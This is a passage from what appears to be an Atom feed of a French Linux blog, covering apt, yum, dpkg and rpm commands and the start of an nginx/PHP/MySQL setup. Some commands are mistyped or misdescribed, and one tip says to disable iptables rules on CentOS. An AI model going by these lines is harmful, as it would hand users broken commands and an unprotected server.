&lt;span class=&quot;c&quot;&gt;# upgrade distribution&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt full-upgrade &lt;span class=&quot;c&quot;&gt;# apt dist-upgrade&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum upgarde

&lt;span class=&quot;c&quot;&gt;# make searchs&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt search xxxxx &lt;span class=&quot;c&quot;&gt;# apt-cache search xxxxx&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum search xxxxx

&lt;span class=&quot;c&quot;&gt;# install package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;xxxxx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;xxxxx

&lt;span class=&quot;c&quot;&gt;# info on package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-cache showpkg php
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum info php  &lt;span class=&quot;c&quot;&gt;# ou rpm -i php&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# download package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt download xxxxx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yumdownloader xxxxx &lt;span class=&quot;c&quot;&gt;# via yum-utils&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# delete package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt remove xxxxx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum remove xxxxx

&lt;span class=&quot;c&quot;&gt;# list all available packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt list
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum list available &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nginx-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum list all

&lt;span class=&quot;c&quot;&gt;# list all installed packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt list &lt;span class=&quot;nt&quot;&gt;--installed&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum list installed

&lt;span class=&quot;c&quot;&gt;# list all upgradable packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt list &lt;span class=&quot;nt&quot;&gt;--upgradable&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum list updates

&lt;span class=&quot;c&quot;&gt;# obsoletes packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum obsoletes

&lt;span class=&quot;c&quot;&gt;# last packages added&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum recent

&lt;span class=&quot;c&quot;&gt;# repo list&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum repolist
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;apt&quot;&gt;apt&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;gestionnaire de paquets&lt;/li&gt;
  &lt;li&gt;Debian based (Ubuntu,…)&lt;/li&gt;
  &lt;li&gt;format &lt;code class=&quot;highlighter-rouge&quot;&gt;.deb&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;gestion des dépendances&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# repository config&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/apt/sources.list

&lt;span class=&quot;c&quot;&gt;# example&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/apt/sources.list
...
deb http://ftp.fr.debian.org/debian/ stretch main
deb-src http://ftp.fr.debian.org/debian/ stretch main

deb http://security.debian.org/debian-security stretch/updates main
deb-src http://security.debian.org/debian-security stretch/updates main
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;format-dpkg&quot;&gt;format dpkg&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;DPKG (Debian Package) est un gestionnaire de package pour les distributions de type Debian. Il utilise une base de données locale qui se trouve dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/dpkg&lt;/code&gt;. Il ne s’occupe pas des dépendances entre paquets.&lt;/p&gt;

&lt;h4 id=&quot;nomenclature&quot;&gt;nomenclature&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nom_version–édition_archi.deb&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nom&lt;/code&gt; du paquet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;version&lt;/code&gt; de celui-ci&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;edition&lt;/code&gt; du paquet spécifique à la distribution&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;architecture&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ex: tmux_2.3-4_amd64.deb&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;nom=tmux&lt;/li&gt;
    &lt;li&gt;version=2.3&lt;/li&gt;
    &lt;li&gt;edition=4&lt;/li&gt;
    &lt;li&gt;archi=amd64&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;quelques-commandes&quot;&gt;quelques commandes&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# install package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; tmux_2.3-4_amd64.deb

&lt;span class=&quot;c&quot;&gt;# update packages only if they are already installed&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; tmux | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; ^ii &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; tmux_2.3-4_amd64.deb

&lt;span class=&quot;c&quot;&gt;# install all folder packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; dossier/

&lt;span class=&quot;c&quot;&gt;# delete package, but keep config files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; tmux

&lt;span class=&quot;c&quot;&gt;# delete package, with this config files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; tmux

&lt;span class=&quot;c&quot;&gt;# list all knowed packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ii means installed&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# make search&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;apt*&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# list all installed packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;--get-selection&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# what is the package of this file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; /usr/sbin/vim

&lt;span class=&quot;c&quot;&gt;# list all packages files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; tmux

&lt;span class=&quot;c&quot;&gt;# info on package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; vim

&lt;span class=&quot;c&quot;&gt;# delete all non installed packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ou --pending&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# reconfigure (post installation scrip)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dpkg-reconfigure nginx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;yum&quot;&gt;yum&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;gestionnaire de paquets&lt;/li&gt;
  &lt;li&gt;Red Hat based (RHEL, CentOS, Fedora, …)&lt;/li&gt;
  &lt;li&gt;format &lt;code class=&quot;highlighter-rouge&quot;&gt;.rpm&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;gestion des dépendances&lt;/li&gt;
  &lt;li&gt;sera remplacé par DNF (prochainement)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# global conf&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/yum.conf

&lt;span class=&quot;c&quot;&gt;# repositories config&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/yum.repo.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# example&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/yum.repo.d/epel.repo
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;epel]
&lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Extra Packages &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Enterprise Linux 7 - &lt;span class=&quot;nv&quot;&gt;$basearch&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#baseurl=http://download.fedoraproject.org/pub/epel/7/$basearch&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;metalink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;https://mirrors.fedoraproject.org/metalink?repo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;epel-7&amp;amp;arch&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$basearch&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;failovermethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority
&lt;span class=&quot;nv&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;span class=&quot;nv&quot;&gt;gpgcheck&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;span class=&quot;nv&quot;&gt;gpgkey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Directives de la configuration du dépôt:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;[epel]&lt;/code&gt; : nom court du dépôt&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; : nom long&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;baseurl&lt;/code&gt; : lien qui pointe sur la base de paquets&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mirorlist&lt;/code&gt; : lien qui pointe vers une liste de liens&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;metalink&lt;/code&gt; : même chose que mirorlist&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gpgcheck&lt;/code&gt; : faut-il demander une signature (0 ou 1)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;enabled&lt;/code&gt; : le dépôt est-il activé (0 ou 1)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gpgkey&lt;/code&gt; : emplacement des clés GPG locales&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;format-rpm&quot;&gt;format rpm&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;RPM (Red Hat Package Manager) est un gestionnaire de package pour les distributions de type Red Hat. RPM a été inventé par ces derniers. Il utilise une base de données locale qui se trouve dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/lib/rpm&lt;/code&gt;. Il ne s’occupe pas des dépendances entre paquets.&lt;/p&gt;

&lt;h4 id=&quot;nomenclature-1&quot;&gt;nomenclature&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nom–version–edition.archi.rpm&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nom&lt;/code&gt; du paquet&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;version&lt;/code&gt; de celui-ci&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;edition&lt;/code&gt; du paquet spécifique à la distribution&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;architecture&lt;/code&gt;
    &lt;blockquote&gt;
      &lt;p&gt;Ex: php-5.4.16-43.el7_4.x86_64.rpm&lt;/p&gt;
      &lt;ul&gt;
        &lt;li&gt;nom=php&lt;/li&gt;
        &lt;li&gt;version=5.4.16&lt;/li&gt;
        &lt;li&gt;edition=43.el7_4&lt;/li&gt;
        &lt;li&gt;archi=x86_64&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;quelques-commandes-1&quot;&gt;quelques commandes&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# install package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; php-5.4.16-43.el7_4.x86_64.rpm

&lt;span class=&quot;c&quot;&gt;# install or update&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-Uvh&lt;/span&gt; php-5.4.16-43.el7_4.x86_64.rpm &lt;span class=&quot;c&quot;&gt;# verbose mode + progress bar&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# update only if package is already installed&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-Fvh&lt;/span&gt; php-5.4.16-43.el7_4.x86_64.rpm &lt;span class=&quot;c&quot;&gt;# verbose mode + progress bar&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# after update, old config files are keeped as *.rpmave&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# delete package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; php
&lt;span class=&quot;c&quot;&gt;# Options :&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#	--force&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#	--nodeps&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# list all installed packages&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-qa&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# info on package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-qi&lt;/span&gt; nginx

&lt;span class=&quot;c&quot;&gt;# package files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-ql&lt;/span&gt; php

&lt;span class=&quot;c&quot;&gt;# what is the package of this file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-qf&lt;/span&gt; /usr/sbin/vim

&lt;span class=&quot;c&quot;&gt;# search inside the package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-qp&lt;/span&gt; php-5.4.16-43.el7_4.x86_64.rpm

&lt;span class=&quot;c&quot;&gt;# package dependances&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--requires&lt;/span&gt; nginx

&lt;span class=&quot;c&quot;&gt;# what provides the package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--provides&lt;/span&gt; nginx

&lt;span class=&quot;c&quot;&gt;# scripts executed on install and on deletation&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--scripts&lt;/span&gt; nginx

&lt;span class=&quot;c&quot;&gt;# changelog&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--changelog&lt;/span&gt; nginx

&lt;span class=&quot;c&quot;&gt;# info on package evolution&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm &lt;span class=&quot;nt&quot;&gt;-V&lt;/span&gt; php
&lt;span class=&quot;c&quot;&gt;# S : size changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 5 : md5 sum changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# T : modif. date has changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# U : owner has changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# G : goup has changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# L : symb. link has changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# M : permissions or file type has changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# D : device has been changed&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# c : it is a config. file&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# extract package content (cpio archive)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpm2cpio php-5.4.16-43.el7_4.x86_64.rpm | cpio &lt;span class=&quot;nt&quot;&gt;-diun&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# install new kernel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# with -i option&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# restart + test&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# delete old kernels (-e)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# grub1: edit /boot/grub/grub.conf with Default on new noyau&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# grub2: cmd grub2-mkconfig&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>nginx + php + mysql + ssl/tls</title>
   <link href="http://localhost:4000/linux/2018/01/15/nginx-php-mysql-ssl/"/>
   <updated>2018-01-15T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/2018/01/15/nginx-php-mysql-ssl</id>
   <content type="html">&lt;!--more--&gt;

&lt;p&gt;Mise en place d’un serveur web de type Nginx avec configuration de base avec PHP et MySql. Nginx est un serveur web d’origine russe crée en 2002 pour les besoins d’un site russe à très fort trafic. C’est un concurrent à Apache qui date de 1995. La dernière partie consistera à la mise en place d’un certificat SSL/TSL pour avoir du &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;nginx&quot;&gt;nginx&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;installation&quot;&gt;installation&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Debian&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt update
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nginx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mysql-client mysql-server
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;php7.0-fpm php7.0-mysql

&lt;span class=&quot;c&quot;&gt;# CentOS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum makecache
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nginx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mariadb mariadb-server 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;php-fpm php-mysql
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;Pensez à désactiver les règles d’iptables sur CentOS ou dérivée !&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;gérer-le-service&quot;&gt;gérer le service&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# via nginx&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nginx &lt;span class=&quot;c&quot;&gt;# start server&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nginx –s stop &lt;span class=&quot;c&quot;&gt;# stop server&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nginx –s quit &lt;span class=&quot;c&quot;&gt;# stop server but reply to latests client&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nginx –t &lt;span class=&quot;c&quot;&gt;# check config files syntax&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nginx –s reload &lt;span class=&quot;c&quot;&gt;# reload config&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# via systemd&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl status nginx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start nginx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl stop nginx
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;nginx &lt;span class=&quot;c&quot;&gt;# start the service on boot&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl reload nginx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;configuration&quot;&gt;configuration&lt;/h4&gt;

&lt;p&gt;Le fichier de configuration globale est &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/nginx/nginx.conf&lt;/code&gt;, ce fichier inclus les différents fichiers de configuration de serveurs.&lt;/p&gt;

&lt;h6 id=&quot;debian&quot;&gt;Debian&lt;/h6&gt;

&lt;p&gt;Fonctionnement avec 2 dossiers, &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/nginx/sites-available/*&lt;/code&gt; qui contient tous les sites disponibles sur les serveurs, ainsi que &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/nginx/sites-enabled/*&lt;/code&gt; qui contient les sites qui sont activés et accessibles par les visiteurs. L’activation d’un site consiste en la création d’un lien symbolique de &lt;code class=&quot;highlighter-rouge&quot;&gt;sites-available/&lt;/code&gt; vers &lt;code class=&quot;highlighter-rouge&quot;&gt;sites-enables/&lt;/code&gt; du fichier de configuration du serveur. C’est un fonctionnement proche de celui d’Apache.&lt;/p&gt;

&lt;h6 id=&quot;centos&quot;&gt;CentOS&lt;/h6&gt;

&lt;p&gt;On utilise &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/nginx/conf.d/*&lt;/code&gt; pour mettre la configuration de nos serveurs, les fichiers doivent être du type &lt;code class=&quot;highlighter-rouge&quot;&gt;*.conf&lt;/code&gt; (se terminent par &lt;code class=&quot;highlighter-rouge&quot;&gt;.conf&lt;/code&gt;) pour être pris en compte.&lt;/p&gt;

&lt;p&gt;On peut bien sûr modifier l’architecture de base, et utiliser celle que l’on souhaite.&lt;/p&gt;

&lt;h6 id=&quot;configuration-basique&quot;&gt;Configuration basique&lt;/h6&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
